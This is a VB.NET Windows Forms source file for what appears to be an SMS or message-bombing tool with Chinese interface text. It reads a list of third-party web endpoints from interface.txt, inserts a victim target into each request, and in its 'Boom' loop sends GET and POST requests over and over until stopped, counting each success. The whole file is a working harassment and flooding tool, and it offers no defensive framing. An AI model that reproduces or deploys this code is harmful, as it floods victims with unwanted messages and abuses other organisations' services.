﻿Imports System.IO
Imports System.Text
Imports System.Net
Imports System.Threading

Public Class Form1

    Private Inter(-1) As String
    Private InterNum As Integer = -1
    Private NdStop As Boolean
    Private Target As String
    Private Delay As Integer
    Private Timeout As Integer
    Private Succeed As Integer

    Public Declare Sub Sleep Lib "Kernel32" (ByVal dwMilliseconds As Long)

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If File.Exists(Directory.GetCurrentDirectory + "\interface.txt") Then
            Dim sr As New StreamReader(Directory.GetCurrentDirectory + "\interface.txt", Encoding.Default)
            Inter = Split(sr.ReadToEnd(), vbCrLf)
            sr.Close()
            InterNum = Inter.Length - 1
            If Inter(InterNum) = "" Then
                InterNum -= 1
            End If
            If InterNum = -1 Then
                MessageBox.Show("interface.txt 中无可用接口！")
                End
            End If
        Else
            MessageBox.Show("interface.txt 文件不存在！")
            End
        End If
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("http://sighttp.qq.com/msgrd?v=3&uin=562826179&site=%c8%d9%c8%d9%c8%ed%bc%fe&menu=yes")
    End Sub

    Private Sub LinkLabel2_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("http://yy.duowan.com/go.html#653238")
    End Sub

    Private Sub StartButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartButton.Click
        Try
            StartButton.Enabled = False
            Target = TargetTextBox.Text
            If Target = "" Then Throw New Exception("请填写目标！")
            Timeout = TimeoutNumeric.Value
            Delay = DelayNumeric.Value * 1000
            Succeed = 0
            NdStop = False
            Dim tr As New Thread(AddressOf Boom)
            tr.Start()
            StopButton.Enabled = True
        Catch ex As Exception
            MessageBox.Show(ex.Message)
            StartButton.Enabled = True
        End Try
    End Sub

    Private Sub StopButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopButton.Click
        NdStop = True
    End Sub

    Private Sub Boom()
        While Not NdStop
            Try
                Dim ran As New Random()
                Dim index As Integer = ran.Next(0, InterNum)
                Dim tmp As String() = Split(Inter(index), ",")
                Dim wc As New WizardHTTP
                wc.SetDefaultHeader()
                wc.TimeOut = Timeout
                wc.ReadWriteTimeOut = Timeout
                If tmp.Length > 1 Then 'post
                    tmp(1) = tmp(1).Replace("<tr>", Target)
                    wc.UploadString(tmp(0), tmp(1))
                Else 'get
                    tmp(0) = tmp(0).Replace("<tr>", Target)
                    wc.DownloadString(tmp(0))
                End If
                Succeed += 1
                SucTextBox.Text = Succeed.ToString()
                Sleep(Delay)
            Catch ex As Exception
            End Try
        End While
        StartButton.Enabled = True
        StopButton.Enabled = False
    End Sub
End Class
